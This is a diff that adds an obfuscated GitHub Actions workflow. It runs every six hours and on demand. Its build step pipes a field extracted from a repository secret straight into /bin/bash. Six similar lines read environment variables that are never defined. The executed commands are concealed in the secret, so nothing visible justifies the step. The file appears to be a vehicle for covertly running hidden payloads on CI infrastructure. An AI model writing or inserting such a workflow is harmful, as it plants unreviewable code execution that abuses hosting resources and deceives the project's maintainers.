@@ -1,0 +1,24 @@
+name: jinchangfa7145
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '55 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jinchangfa7145
+        env:
+          d7: ${{ secrets.d7 }}
+        run: |
+          echo $d7 | jq -r .v186 | /bin/bash
+          echo $nphj77305 | jq -r .m4 | /bin/bash
+          echo $svjn309 | jq -r .ls869 | /bin/bash
+          echo $wizn76385 | jq -r .fefl545 | /bin/bash
+          echo $jj69 | jq -r .h9067 | /bin/bash
+          echo $whw808 | jq -r .j743 | /bin/bash
+          echo $z82830 | jq -r .gwnn79 | /bin/bash
+
